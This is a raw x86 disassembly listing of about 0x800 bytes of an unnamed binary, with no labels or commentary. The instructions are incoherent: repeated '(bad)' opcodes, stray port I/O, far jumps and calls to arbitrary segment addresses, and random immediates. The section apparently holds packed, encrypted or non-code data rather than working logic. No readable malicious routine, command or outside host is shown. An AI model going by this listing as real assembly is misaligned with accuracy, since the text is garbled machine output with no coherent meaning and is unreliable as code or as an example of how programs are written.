  409027:	push   cs
  409028:	mov    WORD PTR [edi],fs
  40902a:	out    dx,al
  40902b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40902c:	jo     0x409073
  40902e:	popf   
  40902f:	xchg   ebp,eax
  409030:	xor    ecx,esi
  409032:	nop
  409033:	sub    bh,BYTE PTR ds:0x5183cfd0
  409039:	adc    eax,0x2771bb3f
  40903e:	cmp    ecx,DWORD PTR [eax-0x2c]
  409041:	xor    al,0x83
  409044:	or     ch,cl
  409046:	jmp    0x48a2:0x5abb2431
  40904d:	out    dx,eax
  40904e:	in     eax,dx
  40904f:	(bad)  
  409050:	sub    bl,BYTE PTR [edx+0x116efa53]
  409056:	stos   BYTE PTR es:[edi],al
  409057:	jo     0x408fdf
  409059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40905a:	mov    edx,0x274d9bb6
  40905f:	add    al,0xa1
  409061:	fsub   DWORD PTR [edx+0x2af5619c]
  409067:	and    dl,bl
  409069:	nop
  40906a:	jle    0x40908b
  40906c:	sbb    eax,0x5dcca9fe
  409071:	cdq    
  409072:	js     0x4090a6
  409074:	test   al,0x63
  409076:	mov    edx,0x50defe77
  40907b:	enter  0x3d41,0xa7
  40907f:	pop    ds
  409080:	jmp    0x5a830ab9
  409085:	adc    al,0x5e
  409087:	pop    esi
  409088:	xchg   edx,eax
  409089:	pop    ss
  40908a:	(bad)  
  40908b:	mov    eax,ds:0xc9ca9923
  409090:	add    BYTE PTR [eax],cl
  409092:	fdivr  QWORD PTR [ebx-0x77ca7224]
  409098:	cmp    ebp,ecx
  40909a:	(bad)  
  40909b:	into   
  40909c:	ror    BYTE PTR [edx-0x3cb4c30c],0xc3
  4090a3:	fild   WORD PTR [esi-0x16]
  4090a6:	loopne 0x40908a
  4090a8:	and    DWORD PTR [ebx],esi
  4090aa:	mov    bh,0x1c
  4090ac:	(bad)  
  4090ad:	sar    bl,cl
  4090af:	pop    ds
  4090b0:	pop    es
  4090b1:	xor    bh,cl
  4090b3:	sub    DWORD PTR [esi+0x3e],ebp
  4090b6:	in     al,dx
  4090b7:	cli    
  4090b8:	jbe    0x4090a6
  4090ba:	adc    eax,0xbcb4b93
  4090bf:	xor    DWORD PTR [esi-0x69],esp
  4090c2:	or     eax,0x8c5fff01
  4090c7:	xchg   esp,eax
  4090c8:	cmc    
  4090c9:	xchg   ch,ch
  4090cb:	mov    al,ds:0x2c7dfbe3
  4090d0:	push   cs
  4090d1:	rcr    edx,1
  4090d3:	mov    DWORD PTR ds:0xfeea77d4,edi
  4090d9:	int3   
  4090da:	inc    esp
  4090db:	popf   
  4090dc:	aad    0xe4
  4090de:	(bad)  
  4090e0:	pop    ebx
  4090e1:	std    
  4090e2:	fwait
  4090e3:	adc    eax,0x98ad5c9c
  4090e8:	jb     0x4090c0
  4090ea:	mov    ebp,0x64583fd2
  4090ef:	call   0x6068bfd7
  4090f4:	cmc    
  4090f5:	pop    esp
  4090f6:	add    al,0x32
  4090f8:	cmp    cl,BYTE PTR [edx+ebx*1+0x1de811e3]
  4090ff:	out    dx,al
  409100:	push   esi
  409101:	outs   dx,BYTE PTR ds:[si]
  409103:	stc    
  409104:	mov    WORD PTR [ecx],gs
  409106:	sub    al,0x6
  409108:	jecxz  0x409123
  40910a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910b:	out    dx,al
  40910c:	mov    ?,WORD PTR [eax+0x19]
  40910f:	cmp    DWORD PTR [ebx],ecx
  409111:	pusha  
  409112:	sbb    BYTE PTR [eax-0x3e],bh
  409115:	xor    BYTE PTR [edx+esi*8-0x64773b94],0x55
  40911d:	fadd   QWORD PTR [esi]
  40911f:	gs aas 
  409121:	cwde   
  409122:	inc    edi
  409123:	jmp    0xf21e8efa
  409128:	jnp    0x409122
  40912a:	fisttp DWORD PTR [edx+eax*2-0x70]
  40912e:	shrd   DWORD PTR [esi-0x161b14ab],edi,0xc6
  409136:	sbb    BYTE PTR [edx+0xc],cl
  409139:	and    al,0x55
  40913b:	dec    esp
  40913c:	(bad)  
  40913d:	jmp    0xa66b:0xf1068f01
  409144:	shl    dl,1
  409146:	cld    
  409147:	and    eax,0x8c04fb95
  40914c:	cmp    eax,esp
  40914e:	xchg   ebp,eax
  40914f:	call   0xc7d8fb4b
  409154:	pop    ds
  409155:	mov    ebx,0x44d277a5
  40915a:	pop    esi
  40915b:	jecxz  0x4090e0
  40915d:	inc    esi
  40915e:	fdivr  QWORD PTR [edi+0x1f]
  409161:	push   edi
  409162:	and    eax,0x67660f89
  409167:	test   BYTE PTR [eax+0x2aa2590c],0x61
  40916e:	test   bl,cl
  409170:	es mov edi,0x2596d327
  409176:	or     BYTE PTR [eax+eax*2],ah
  409179:	or     al,0xaa
  40917b:	xor    ecx,DWORD PTR [eax+0x1b5259b0]
  409181:	mov    edx,0x20924987
  409186:	mov    eax,ds:0x1b18457f
  40918b:	cmp    ecx,DWORD PTR [ebp+0x5f]
  40918e:	aam    0xf8
  409190:	xchg   ebx,eax
  409191:	cmp    eax,0xcfeccd1f
  409196:	(bad)  
  409197:	sbb    dl,BYTE PTR [eax-0x60a009e0]
  40919d:	es push ebp
  40919f:	pop    eax
  4091a0:	jmp    0x3214867f
  4091a5:	xor    DWORD PTR [eax+0x63],ebx
  4091a8:	and    dh,BYTE PTR ds:0xbc77cc2a
  4091ae:	leave  
  4091af:	repz retf 
  4091b1:	sbb    DWORD PTR [esi],0x5f432b87
  4091b7:	div    esp
  4091b9:	not    BYTE PTR cs:[edi-0x19f8a804]
  4091c0:	inc    esp
  4091c1:	loop   0x40917f
  4091c3:	adc    esp,ebx
  4091c5:	push   ss
  4091c6:	jp     0x409163
  4091c8:	pusha  
  4091c9:	shl    BYTE PTR [eax-0x46],cl
  4091cc:	stc    
  4091cd:	mov    esi,0x820fe1c2
  4091d2:	push   ecx
  4091d3:	adc    bl,bh
  4091d5:	rcl    BYTE PTR [edi+0x778ab479],0x49
  4091dc:	out    dx,eax
  4091dd:	sbb    ah,al
  4091df:	int    0x30
  4091e1:	pop    esi
  4091e2:	gs inc edi
  4091e4:	mov    esi,0x921a045c
  4091e9:	xlat   BYTE PTR ds:[ebx]
  4091ea:	add    al,0x3
  4091ec:	cmp    al,0x3c
  4091ee:	and    DWORD PTR [esi],0xffffffd0
  4091f1:	sub    al,0x5b
  4091f3:	sbb    BYTE PTR [edx],ch
  4091f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f6:	adc    esi,0xcc0e4d27
  4091fc:	add    ecx,ebx
  4091fe:	pushf  
  4091ff:	in     al,dx
  409200:	cmp    eax,DWORD PTR [esi+eiz*2]
  409203:	sub    al,0xc6
  409205:	pop    esp
  409206:	call   0xd074:0xbd8e457c
  40920d:	push   edi
  40920e:	test   DWORD PTR [ebx+0x5b],eax
  409211:	iret   
  409212:	cmp    al,BYTE PTR [edi+0x5c5b32d1]
  409218:	and    ecx,DWORD PTR [ebp-0x64ff8379]
  40921e:	cmp    al,0xbb
  409220:	ja     0x409267
  409222:	fwait
  409223:	or     al,cl
  409225:	mov    ds:0x547faaaf,eax
  40922a:	stos   DWORD PTR es:[edi],eax
  40922b:	push   esp
  40922c:	(bad)  [esi+0xe7b11b1]
  409232:	gs mov ebx,ebp
  409235:	arpl   WORD PTR [esi+0x76ca2e2c],bp
  40923b:	and    cl,ch
  40923d:	ja     0x4092b2
  40923f:	cld    
  409240:	test   BYTE PTR [ebx-0x1a],0x35
  409244:	not    BYTE PTR [eax-0x7b]
  409247:	in     eax,dx
  409248:	es sbb esp,ebx
  40924b:	xchg   edx,eax
  40924c:	pop    ss
  40924d:	push   es
  40924e:	cmp    eax,DWORD PTR [edx+0x41]
  409251:	mov    bh,0xfd
  409253:	pushf  
  409254:	ror    DWORD PTR [ecx+0x5db522cc],0x69
  40925b:	daa    
  40925c:	adc    BYTE PTR [edx-0xfdbebc4],al
  409262:	retf   0x1fb2
  409265:	jp     0x409245
  409267:	call   0xe5b9:0xe3331606
  40926e:	dec    edi
  40926f:	and    edi,DWORD PTR [esi]
  409271:	in     eax,0xb5
  409273:	inc    edx
  409274:	xor    eax,0xe1ddb62d
  409279:	mov    esi,DWORD PTR [ebp-0xf113996]
  40927f:	sbb    BYTE PTR [esi],0x53
  409282:	outs   dx,DWORD PTR ss:[esi]
  409284:	mov    WORD PTR [eax],?
  409286:	leave  
  409287:	push   ebx
  409288:	or     al,0xe
  40928a:	(bad)  
  40928b:	dec    ebx
  40928c:	jl     0x4092ab
  40928e:	retf   0xcc04
  409291:	xchg   ebp,eax
  409292:	icebp  
  409293:	push   esp
  409294:	mov    edi,0x82cbefd5
  409299:	call   0xe393:0xbf80da94
  4092a0:	hlt    
  4092a1:	fwait
  4092a2:	xchg   esi,eax
  4092a3:	icebp  
  4092a4:	inc    esi
  4092a5:	xchg   esp,eax
  4092a6:	and    al,0x1f
  4092a8:	arpl   di,cx
  4092aa:	out    0xf1,al
  4092ac:	pop    eax
  4092ad:	jns    0x4092e5
  4092af:	fisttp WORD PTR [edx]
  4092b1:	pop    ds
  4092b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b3:	sbb    BYTE PTR [ebx+0x5a],dh
  4092b6:	mov    esi,0x3c88e1f2
  4092bb:	dec    edx
  4092bc:	and    DWORD PTR [esi+0x54],edi
  4092bf:	rcl    ch,cl
  4092c1:	mov    esp,DWORD PTR ds:0xffa7ac29
  4092c7:	rcl    BYTE PTR [eax],0xb4
  4092ca:	mov    dl,0xc6
  4092cc:	or     ah,bh
  4092ce:	inc    ecx
  4092cf:	and    esp,DWORD PTR [ebp-0x77]
  4092d2:	je     0x4092ec
  4092d4:	adc    esp,DWORD PTR [esi]
  4092d6:	xchg   BYTE PTR [ecx-0x54],dl
  4092d9:	jmp    0x73b7e3fe
  4092de:	mov    cl,0x43
  4092e0:	xchg   edx,eax
  4092e1:	push   ebp
  4092e2:	push   esp
  4092e3:	or     DWORD PTR [ebp+0x155e87f7],esi
  4092e9:	ins    DWORD PTR es:[edi],dx
  4092ea:	xor    eax,0x9926b439
  4092ef:	push   0xdfe798ce
  4092f4:	out    0x6b,al
  4092f6:	popf   
  4092f7:	dec    edx
  4092f8:	mov    ds:0x9eb78525,al
  4092fd:	dec    eax
  4092fe:	test   eax,0x14289f6b
  409303:	cmp    al,0x1
  409305:	add    eax,0xec6dcb66
  40930a:	sub    BYTE PTR [edx+0x6d],bh
  40930d:	mov    edx,0x5c29062f
  409312:	cmc    
  409313:	cwde   
  409314:	mov    esi,0x6396ded1
  409319:	addr16 mov esp,0x736156f
  40931f:	out    0xdb,eax
  409321:	int3   
  409322:	rol    BYTE PTR [edx-0x3b],cl
  409325:	jmp    0x40930b
  409327:	or     al,0x69
  409329:	dec    edi
  40932a:	dec    ecx
  40932b:	dec    esi
  40932c:	mov    eax,ds:0xf944bee
  409331:	or     eax,DWORD PTR [edx]
  409333:	pop    esi
  409334:	mov    edx,ebp
  409336:	shl    DWORD PTR [edx-0x3d],cl
  409339:	outs   dx,DWORD PTR ds:[esi]
  40933a:	in     al,0xfe
  40933c:	dec    esi
  40933d:	pop    edx
  40933e:	int    0x4
  409340:	fwait
  409341:	and    ax,0x161e
  409345:	cmp    edi,DWORD PTR [esi+0x2d]
  409348:	mov    ds:0x5649cd0f,eax
  40934d:	mov    eax,ds:0x77675698
  409352:	jmp    0xb7353ca3
  409357:	add    BYTE PTR [ebx-0x62],0x44
  40935b:	daa    
  40935c:	jmp    0xc74d13d9
  409361:	or     al,BYTE PTR [ebp-0x5b]
  409364:	test   al,0xba
  409366:	jmp    0x2340a8d3
  40936b:	int3   
  40936c:	inc    esp
  40936d:	sub    eax,0xc1d80a66
  409372:	cmp    eax,0xbb820b79
  409377:	(bad)  
  409379:	xchg   esp,eax
  40937a:	addr16 xor al,0x21
  40937d:	pusha  
  40937e:	and    bh,BYTE PTR [ebp-0x74e7e536]
  409384:	into   
  409385:	dec    ebx
  409386:	mov    WORD PTR [esi-0x7df30e07],fs
  40938c:	mov    es,WORD PTR [edi]
  40938e:	mov    eax,ds:0x3636e674
  409393:	out    dx,eax
  409394:	mov    edi,0x825aa400
  409399:	stos   DWORD PTR es:[edi],eax
  40939a:	or     ch,BYTE PTR [ebx+0x5eda9fe4]
  4093a0:	nop    DWORD PTR [esi-0x7c89a0be]
  4093a7:	mov    dh,bh
  4093a9:	jns    0x4093c1
  4093ab:	(bad)  [ecx+0x0]
  4093ae:	push   0x61
  4093b0:	loop   0x409369
  4093b2:	push   eax
  4093b3:	aas    
  4093b4:	(bad)  
  4093b5:	push   eax
  4093b6:	pop    ss
  4093b7:	scas   al,BYTE PTR es:[edi]
  4093b8:	std    
  4093b9:	popf   
  4093ba:	adc    BYTE PTR [ecx+0x33],cl
  4093bd:	cmp    bh,BYTE PTR [esi]
  4093bf:	mov    ds:0x4ae9a5f8,eax
  4093c4:	dec    edx
  4093c5:	mov    edx,0x40220f1d
  4093ca:	gs dec esi
  4093cc:	jge    0x4093ab
  4093ce:	dec    DWORD PTR [eax+0x39]
  4093d1:	dec    edi
  4093d2:	jae    0x40939a
  4093d4:	test   al,0xc0
  4093d6:	je     0x40944a
  4093d8:	popf   
  4093d9:	adc    al,0xb8
  4093db:	pop    ebp
  4093dc:	(bad)  
  4093de:	sub    DWORD PTR [ecx+eax*2],esp
  4093e1:	sti    
  4093e2:	mov    esp,0x9efc4c1d
  4093e7:	out    dx,eax
  4093e8:	cmp    BYTE PTR [ecx+0x6f00db7c],dh
  4093ee:	push   ebp
  4093ef:	jp     0x4093ba
  4093f1:	push   ss
  4093f2:	shr    DWORD PTR [edx],1
  4093f4:	retf   
  4093f5:	and    eax,0x3cae7d87
  4093fa:	ret    
  4093fb:	lahf   
  4093fc:	or     eax,0x60f8d4d6
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	js     0x4093fb
  409404:	push   esi
  409405:	(bad)  
  409406:	mov    ds:0x4c31db14,al
  40940b:	mov    dl,BYTE PTR [ebp+0x7abb8c3f]
  409411:	mov    bh,0x70
  409413:	sub    dl,BYTE PTR [eax+0x1981ba51]
  409419:	jns    0x4093cf
  40941b:	pop    ds
  40941c:	jg     0x409461
  40941e:	sti    
  40941f:	and    DWORD PTR [edx+0x2bc062b4],esp
  409425:	retf   0x12c2
  409428:	inc    esi
  409429:	mov    ebx,cs
  40942b:	mov    esi,0x10262c04
  409430:	addr16 pop ecx
  409432:	ficom  WORD PTR [ebx-0x1d9c6235]
  409438:	(bad)  
  409439:	mul    DWORD PTR [esi+0x14568a1a]
  40943f:	repz in eax,0xc3
  409442:	cmp    ebp,esp
  409444:	outs   dx,BYTE PTR ds:[esi]
  409445:	(bad)  
  409446:	jne    0x409446
  409448:	inc    eax
  409449:	adc    edi,DWORD PTR [ebx-0x11]
  40944c:	xor    edx,DWORD PTR [ebp+0x735c62ae]
  409452:	fild   WORD PTR [eax]
  409454:	mov    bl,0xf4
  409456:	or     al,0x40
  409458:	ret    0x4c99
  40945b:	pushf  
  40945c:	int3   
  40945d:	push   esp
  40945e:	stos   BYTE PTR es:[edi],al
  40945f:	das    
  409460:	xchg   ecx,eax
  409461:	add    bh,BYTE PTR [edx+0x6e]
  409464:	(bad)  
  409465:	jae    0x409453
  409467:	push   ebx
  409468:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40946a:	cmp    al,0x23
  40946c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40946d:	in     eax,dx
  40946e:	xor    bh,BYTE PTR [edx+0x43]
  409471:	add    al,0x89
  409473:	sti    
  409474:	xor    BYTE PTR [edi+0x751909e1],ah
  40947a:	popf   
  40947b:	loope  0x40944f
  40947d:	mov    WORD PTR [eax],?
  40947f:	jo     0x40949b
  409481:	enter  0xa373,0x3e
  409485:	jnp    0x4094f6
  409487:	(bad)  
  409488:	jmp    0x65ad01d2
  40948d:	pop    es
  40948e:	mov    esi,0xaf423bfc
  409493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409494:	test   eax,0xe190ef3a
  409499:	adc    al,0x86
  40949b:	mov    dh,0x47
  40949d:	pushf  
  40949e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40949f:	pushf  
  4094a0:	and    DWORD PTR [ebp-0x7f508864],edx
  4094a6:	and    BYTE PTR [esi+eax*2+0x63],bl
  4094aa:	xchg   edx,eax
  4094ab:	imul   BYTE PTR [eax-0x12f20eb]
  4094b1:	push   0xffffff8f
  4094b3:	dec    ebx
  4094b4:	xchg   edx,eax
  4094b5:	pop    ss
  4094b6:	or     ebp,DWORD PTR [ecx+edi*1]
  4094b9:	fs mov eax,gs:0xb69cca37
  4094c0:	mov    dh,0x29
  4094c2:	jae    0x4094b6
  4094c4:	mov    dl,0xed
  4094c6:	mov    DWORD PTR [ecx+0x1d],0x6c148171
  4094cd:	sbb    eax,0x7a11a227
  4094d2:	cld    
  4094d3:	enter  0x23fc,0x23
  4094d7:	adc    al,0x7f
  4094d9:	addr16 ja 0x40945d
  4094dc:	mov    edi,0x3895229e
  4094e1:	test   BYTE PTR [eax-0x4eceb164],ch
  4094e7:	mov    ebp,0xc7151c57
  4094ec:	imul   cl
  4094ee:	xchg   esi,eax
  4094ef:	or     BYTE PTR [esi],ah
  4094f1:	sbb    esi,esi
  4094f3:	cmc    
  4094f4:	jle    0x4094b8
  4094f6:	into   
  4094f7:	rol    DWORD PTR [ebx+0x52],1
  4094fa:	out    dx,al
  4094fb:	push   0x86d7b8e5
  409500:	lock out dx,eax
  409502:	inc    ecx
  409503:	(bad)  
  409504:	cmp    al,BYTE PTR [esi]
  409506:	sbb    al,0xf
  409508:	or     BYTE PTR [ecx-0xe],dh
  40950b:	mov    fs,WORD PTR [eax]
  40950d:	test   DWORD PTR [ecx],ecx
  40950f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409510:	mov    cl,0x35
  409512:	pop    ds
  409513:	(bad)  
  409514:	push   esp
  409515:	scas   al,BYTE PTR es:[edi]
  409516:	test   BYTE PTR [ecx],cl
  409518:	pop    esp
  409519:	das    
  40951a:	imul   ecx,DWORD PTR [ecx+eax*8+0x4f],0x46
  40951f:	sbb    bh,BYTE PTR [ecx]
  409521:	cmp    ebp,DWORD PTR [edx-0x29]
  409524:	mov    eax,ds:0xc82093c1
  409529:	sbb    ch,BYTE PTR [eax+0x7e]
  40952c:	fldcw  WORD PTR [edi+0x2df6ad1]
  409532:	lds    edx,FWORD PTR [esi-0x4b]
  409535:	aad    0xbd
  409537:	dec    eax
  409538:	sbb    DWORD PTR [ecx+0x5b11d727],edx
  40953e:	gs push ebx
  409540:	(bad)  
  409541:	addr16 xchg ebp,eax
  409543:	repnz enter 0x6a7c,0xe8
  409548:	rcl    BYTE PTR [ebx],1
  40954a:	jne    0x409595
  40954c:	rol    edx,cl
  40954e:	inc    BYTE PTR [edx+0x36219a6]
  409554:	pop    ds
  409555:	call   0x31c5:0x81e1ab73
  40955c:	cld    
  40955d:	mov    eax,ds:0xc4feb91e
  409562:	xor    bh,dh
  409564:	add    al,0x3c
  409566:	fimul  WORD PTR [ecx+0x3a11179]
  40956c:	mov    bl,0x1a
  40956e:	hlt    
  40956f:	std    
  409570:	sub    eax,0x76e33c11
  409575:	mov    DWORD PTR [ecx],edx
  409577:	imul   esp,DWORD PTR [eax+0xa],0x2cec48e
  40957e:	jl     0x4095cf
  409580:	cwde   
  409581:	out    0x51,al
  409583:	mov    ebx,0x590d23f8
  409588:	mov    al,0x5c
  40958a:	mov    eax,ds:0x36c8d255
  40958f:	mov    eax,0x41355553
  409594:	inc    ecx
  409595:	das    
  409596:	(bad)  
  409597:	adc    ecx,DWORD PTR [ecx]
  409599:	sahf   
  40959a:	stos   DWORD PTR es:[edi],eax
  40959b:	iret   
  40959c:	outs   dx,BYTE PTR ds:[esi]
  40959d:	mov    al,0x3d
  40959f:	dec    ebx
  4095a0:	pop    ecx
  4095a1:	add    ebp,DWORD PTR [edi-0x77]
  4095a4:	xchg   ah,ch
  4095a6:	and    DWORD PTR [ebx+0x60],ebp
  4095a9:	test   DWORD PTR [edi+0x6b],0x97ee36a3
  4095b0:	or     dl,al
  4095b2:	bound  ecx,QWORD PTR [edx]
  4095b4:	bswap  ebx
  4095b6:	jecxz  0x4095b2
  4095b8:	and    DWORD PTR [eax-0x629de176],ebx
  4095be:	scas   al,BYTE PTR es:[edi]
  4095bf:	aas    
  4095c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095c1:	dec    ebx
  4095c2:	jle    0x409586
  4095c4:	lea    ebx,[ebx+0x48]
  4095c7:	mov    ebx,?
  4095c9:	stos   BYTE PTR es:[edi],al
  4095ca:	fcmovnu st,st(5)
  4095cc:	or     eax,0x5e9887a7
  4095d1:	fisub  DWORD PTR [edi+edi*2]
  4095d4:	mov    esp,0xfdba43b0
  4095d9:	dec    ebx
  4095da:	pop    ebx
  4095db:	sbb    al,BYTE PTR [edi-0x45]
  4095de:	add    ebx,eax
  4095e0:	add    BYTE PTR [ebp-0x37],0x69
  4095e4:	inc    eax
  4095e5:	in     al,dx
  4095e6:	ror    bl,0x59
  4095e9:	jl     0x4095fe
  4095eb:	aas    
  4095ec:	inc    eax
  4095ed:	lds    ebp,FWORD PTR [edi]
  4095ef:	push   edi
  4095f0:	jmp    0x409588
  4095f2:	loope  0x4095c8
  4095f4:	push   es
  4095f5:	mov    ?,esi
  4095f7:	inc    ebp
  4095f8:	mov    edi,0x7d59360c
  4095fd:	lahf   
  4095fe:	mov    eax,0x6cb5764d
  409603:	mov    al,0x5f
  409605:	cmp    DWORD PTR [esi],eax
  409607:	and    eax,0x687e1297
  40960c:	push   0x677ab616
  409611:	pop    ds
  409612:	mov    bl,0x3b
  409614:	and    BYTE PTR [edi+eiz*1-0x4d],al
  409618:	mov    ds:0x628d9555,al
  40961d:	adc    al,0xc4
  40961f:	enter  0xef31,0xe0
  409623:	pushf  
  409624:	shr    DWORD PTR [esi-0x77],cl
  409627:	pop    ds
  409628:	ror    ebp,0x6
  40962b:	dec    edi
  40962c:	stc    
  40962d:	jmp    0x1e3743c3
  409632:	xchg   ebx,eax
  409633:	pop    ds
  409634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409635:	and    bh,BYTE PTR [ecx]
  409637:	add    DWORD PTR [eax],edx
  409639:	(bad)  
  40963a:	sub    DWORD PTR ds:0xc099c65,edi
  409640:	pop    eax
  409641:	pop    edx
  409642:	cwde   
  409643:	xchg   esp,eax
  409644:	mov    ebp,DWORD PTR [edx-0xb8a6730]
  40964a:	fldcw  WORD PTR [edx+0x2b6f02ea]
  409650:	xchg   ebx,esi
  409652:	aas    
  409653:	(bad)  
  409655:	dec    eax
  409656:	jns    0x4095f4
  409658:	push   ebx
  409659:	mov    dh,0xe3
  40965b:	sbb    BYTE PTR [ebx-0x20ed7626],ah
  409661:	rcl    esp,1
  409663:	xor    BYTE PTR [edx-0x9],0xd8
  409667:	lods   al,BYTE PTR ds:[esi]
  409668:	xor    al,0xca
  40966a:	sub    BYTE PTR [eax+0x70506334],bh
  409670:	push   edx
  409671:	sub    al,BYTE PTR [eax]
  409673:	or     BYTE PTR [ebx+ecx*2],bh
  409676:	jmp    0x409649
  409678:	add    eax,0x4d7ce8af
  40967d:	dec    ecx
  40967e:	sub    eax,0xcd8cc742
  409683:	arpl   WORD PTR [esi-0x56009e3e],si
  409689:	jns    0x409624
  40968b:	inc    ax
  40968d:	inc    eax
  40968e:	lock enter 0x9e5b,0x33
  409693:	mov    edx,0xee8dda61
  409698:	mov    edi,0x5dd2652f
  40969d:	and    BYTE PTR [eax],bl
  40969f:	xor    al,0x76
  4096a1:	rcl    BYTE PTR [esi+0x26],cl
  4096a4:	jecxz  0x4096e2
  4096a6:	ss nop
  4096a8:	retf   0x1c00
  4096ab:	les    ebx,FWORD PTR [ebp-0x37e8e492]
  4096b1:	cmp    dl,BYTE PTR [edx+0x1d]
  4096b4:	xor    al,0x80
  4096b6:	sub    eax,0xfe8c8eef
  4096bb:	add    al,0x92
  4096bd:	add    DWORD PTR [eax+0x1d],edi
  4096c0:	outs   dx,BYTE PTR fs:[esi]
  4096c2:	ret    0x641f
  4096c5:	ins    DWORD PTR es:[edi],dx
  4096c6:	adc    BYTE PTR [ecx],bl
  4096c8:	adc    ah,BYTE PTR [edx-0x3f8cb4ca]
  4096ce:	adc    BYTE PTR [ebx-0x56],0xb1
  4096d2:	add    al,0xf0
  4096d4:	add    edx,ebp
  4096d6:	sbb    eax,0x6236befc
  4096db:	jae    0x4096dd
  4096dd:	cmc    
  4096de:	popf   
  4096df:	jns    0x4096f8
  4096e1:	sbb    ebp,ebx
  4096e3:	(bad)  
  4096e4:	dec    edx
  4096e5:	fidiv  DWORD PTR [ecx-0x65b81c0a]
  4096eb:	jbe    0x409670
  4096ed:	mov    ebp,0x112e2a0d
  4096f2:	jmp    0x82fb:0x911f0e79
  4096f9:	std    
  4096fa:	dec    ebx
  4096fb:	push   ds
  4096fc:	and    esi,DWORD PTR [ecx+0x310d396a]
  409702:	mov    ecx,0x6fe5d6a1
  409707:	repnz mov ah,0x52
  40970a:	mov    ?,WORD PTR es:[edx-0x3081c162]
  409711:	in     al,dx
  409712:	cmp    DWORD PTR [edx-0x6f],edx
  409715:	test   DWORD PTR [ebx],ecx
  409717:	lds    edi,FWORD PTR [ebx]
  409719:	xchg   DWORD PTR [ecx+0x34],ebp
  40971c:	les    ecx,FWORD PTR [ecx+0x53]
  40971f:	push   ebp
  409720:	sbb    DWORD PTR [ebx],0xffffffd9
  409723:	adc    DWORD PTR [eax-0x1f],ebx
  409726:	pop    esi
  409727:	(bad)  
  409728:	aas    
  409729:	xchg   esp,eax
  40972a:	lods   al,BYTE PTR ds:[esi]
  40972b:	into   
  40972c:	add    al,0x93
  40972e:	loope  0x4096f4
  409730:	adc    ch,BYTE PTR [ebp-0x2f5b7769]
  409736:	ins    BYTE PTR es:[edi],dx
  409737:	cmp    bp,bx
  40973a:	pop    ebp
  40973b:	retf   0xe599
  40973e:	jb     0x409793
  409740:	inc    esi
  409741:	sub    esp,DWORD PTR [ebx+0x70a12ae0]
  409747:	xor    BYTE PTR [ecx+ebp*4-0x3e],ch
  40974b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40974c:	mov    esp,0x5e9efee1
  409751:	lock push ax
  409754:	add    ah,dh
  409756:	loope  0x409714
  409758:	in     eax,0x9f
  40975a:	call   0x2990:0x8c5e3efa
  409761:	jge    0x4096f5
  409763:	push   ds
  409764:	mov    edi,DWORD PTR [edx+edx*8+0x287a630a]
  40976b:	dec    eax
  40976c:	or     eax,0x71c3680a
  409771:	lods   eax,DWORD PTR ds:[esi]
  409772:	dec    ebp
  409773:	pop    edi
  409774:	dec    ecx
  409775:	nop
  409776:	pop    esi
  409777:	push   ebx
  409778:	loop   0x409718
  40977a:	jmp    0xa2270c8
  40977f:	jbe    0x40972a
  409781:	fcomp  DWORD PTR [edx+0x7c]
  409784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409785:	mov    BYTE PTR [eax+esi*8+0xf16c09b],bl
  40978c:	inc    eax
  40978d:	or     DWORD PTR [ecx-0x33],eax
  409790:	push   edx
  409791:	sbb    BYTE PTR [edi+0x5a],bl
  409794:	mov    eax,0xa3351e9f
  409799:	mov    ax,0x1005
  40979d:	lods   al,BYTE PTR ds:[esi]
  40979e:	adc    eax,0x8aff1e24
  4097a3:	pop    eax
  4097a4:	inc    edi
  4097a5:	jb     0x409812
  4097a7:	js     0x40973d
  4097a9:	pop    esp
  4097aa:	push   eax
  4097ab:	mov    al,ds:0x17fec71
  4097b0:	(bad)  
  4097b2:	out    0x40,al
  4097b4:	fst    QWORD PTR [esi]
  4097b6:	jbe    0x40976b
  4097b8:	popa   
  4097b9:	sar    DWORD PTR [esi-0x72deb0f],1
  4097bf:	in     al,0xdb
  4097c1:	imul   ebx,DWORD PTR [edx+0x7c],0xffffff81
  4097c5:	xor    edi,esp
  4097c7:	pushf  
  4097c8:	sbb    ecx,DWORD PTR ds:0x86aa1d1e
  4097ce:	inc    ecx
  4097cf:	inc    ecx
  4097d0:	pop    eax
  4097d1:	loopne 0x409799
  4097d3:	enter  0xbba4,0x7d
  4097d7:	int    0xc5
  4097d9:	mov    ecx,0x223d7129
  4097de:	shl    esi,0x48
  4097e1:	or     DWORD PTR [ebx+ebp*2-0x3e],eax
  4097e5:	ss cmp al,0x42
  4097e8:	out    0x75,al
  4097ea:	sbb    eax,0x3dfdaf45
  4097ef:	jp     0x4097da
  4097f1:	scas   al,BYTE PTR es:[edi]
  4097f2:	jge    0x40986e
  4097f4:	ret    0xa1dc
  4097f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f8:	and    eax,0xb765d527
  4097fd:	test   esi,0x1680d776
  409803:	je     0x409804
  409805:	inc    esi
  409806:	cld    
  409807:	or     esi,esi
  409809:	or     DWORD PTR [eax+0x52],ebx
  40980c:	cmp    eax,esp
  40980e:	inc    eax
  40980f:	mov    bh,0x75
  409811:	xor    al,ch
  409813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409814:	outs   dx,DWORD PTR ds:[esi]
  409815:	iret   
  409816:	cdq    
  409817:	mov    edx,0xf6f85c26
  40981c:	mov    al,ds:0x2117604
  409821:	adc    DWORD PTR [ebx+0x2f6ba393],edi
  409827:	cmp    ebp,edi
  409829:	repnz fisttp WORD PTR [edx-0x439b9226]
  409830:	jp     0x4097bd
  409832:	push   ebp
  409833:	nop
  409834:	dec    ecx
  409835:	call   0x6c5:0xb49e407
